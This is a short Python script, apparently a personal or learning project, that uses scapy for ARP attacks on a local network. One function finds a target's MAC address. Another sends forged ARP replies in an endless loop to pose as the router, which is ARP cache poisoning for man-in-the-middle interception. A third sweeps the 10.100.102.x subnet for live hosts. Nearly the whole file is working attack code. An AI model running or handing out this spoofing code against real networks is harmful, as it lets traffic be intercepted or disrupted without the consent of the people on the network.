import scapy.all as s
s.conf.use_pcap = True
def Get_target_mac_adress(my_ip, Target_ip, my_mac):
    arp_request = s.Ether(dst="ff:ff:ff:ff:ff:ff", src= my_mac)/s.ARP(op = 1, psrc = my_ip, pdst = Target_ip, hwsrc= my_mac)
    s.sendp(arp_request)
    res = s.srp(arp_request)
    print(res)
    result, unanswered = res
    Target_mac = result[0][1].hwsrc
    return Target_mac

def send_arp_spoof(my_ip, router_ip, Target_ip, My_mac, Target_mac):
    arp_spoof = s.Ether(dst= Target_mac, src= My_mac)/s.ARP(op=2, pdst= Target_ip, psrc= router_ip, hwsrc= My_mac, hwdst= Target_mac)
    while True:
        s.sendp(arp_spoof)

#target_mac = Get_target_mac_adress("10.100.102.36", "10.100.102.10","fc:b2:14:77:44:66" )
#send_arp_spoof("10.100.102.36", "10.100.102.1", "10.100.102.10","fc:b2:14:77:44:66", target_mac )

def find_all_ip():
    all_ip_list = []
    for i in range(1,255):
        print(f"now checking -  10.100.102.{i}...")
        arp_request = s.Ether(dst = "ff:ff:ff:ff:ff:ff", src="fc:b2:14:77:44:66" )/s.ARP(op= 1, psrc= "10.100.102.34", pdst=f"10.100.102.{i}", hwsrc= "fc:b2:14:77:44:66")   
        
        answered, unanswered = s.srp(arp_request, timeout= 1, verbose= False)
        if answered:
            ip_and_mac = (f"10.100.102.{i}", answered[0][1].hwsrc)
            all_ip_list.append(ip_and_mac)
    return all_ip_list
all_ip = find_all_ip()
print(all_ip)
